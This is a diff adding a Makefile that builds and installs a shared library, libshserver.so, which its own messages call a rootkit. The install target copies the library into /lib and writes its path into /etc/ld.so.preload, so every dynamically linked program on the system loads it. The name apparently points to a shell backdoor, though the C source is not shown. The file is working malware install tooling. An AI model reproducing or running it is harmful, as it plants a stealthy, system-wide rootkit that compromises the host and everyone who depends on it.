@@ -1,0 +1,38 @@
+CC = gcc
+CFLAGS = -Wall -g
+LDFLAGS = -lc -ldl -lutil
+INSTALL_DIR = /lib
+LIB_TARGET = libshserver.so
+LIB_SRCS = libshserver.c etc.c
+LIB_OBJS = $(LIB_SRCS:.c=.o)
+
+all: config $(LIB_TARGET)
+
+config:
+	@python3 config.py > const.h
+
+$(LIB_TARGET): $(LIB_OBJS)
+	$(CC) -fPIC -shared -Wl,-soname,$(LIB_TARGET) $(LIB_OBJS) $(LDFLAGS) -o $(LIB_TARGET)
+
+%.o: %.c
+	$(CC) $(CFLAGS) -fPIC -c $< -o $@
+
+install: all
+	@echo [-] Installing rootkit
+	@install -m 0755 $(LIB_TARGET) $(INSTALL_DIR)/
+	@echo [-] Loading rootkit
+	@echo $(INSTALL_DIR)/$(LIB_TARGET) > /etc/ld.so.preload
+	@echo [-] Done
+
+uninstall:
+	@echo [-] Uninstalling rootkit
+	@echo [-] Removing rootkit files
+	rm -f /etc/ld.so.preload
+	rm -f $(INSTALL_DIR)/$(LIB_TARGET)
+	@echo [-] Done
+
+clean:
+	rm -f $(LIB_TARGET) $(LIB_OBJS)
+
+.PHONY: all config install uninstall clean
+
